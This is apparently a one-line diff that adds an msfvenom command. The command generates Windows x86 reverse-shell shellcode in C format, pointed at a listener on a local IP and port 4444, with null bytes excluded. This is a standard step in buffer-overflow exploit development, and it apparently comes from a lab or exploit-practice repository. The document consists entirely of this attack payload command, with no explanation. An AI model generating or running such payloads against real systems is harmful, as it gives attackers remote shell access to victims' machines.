@@ -1,0 +1,1 @@
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.200.162 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
